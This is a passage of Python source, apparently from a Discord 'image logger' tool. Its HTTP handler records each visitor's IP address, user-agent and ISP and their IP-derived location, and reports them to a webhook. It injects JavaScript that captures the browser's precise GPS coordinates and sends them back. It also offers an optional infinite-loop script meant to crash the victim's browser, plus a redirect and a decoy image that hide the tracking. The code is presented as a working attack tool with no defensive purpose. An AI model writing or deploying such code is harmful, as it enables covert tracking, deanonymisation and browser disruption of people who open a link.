                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
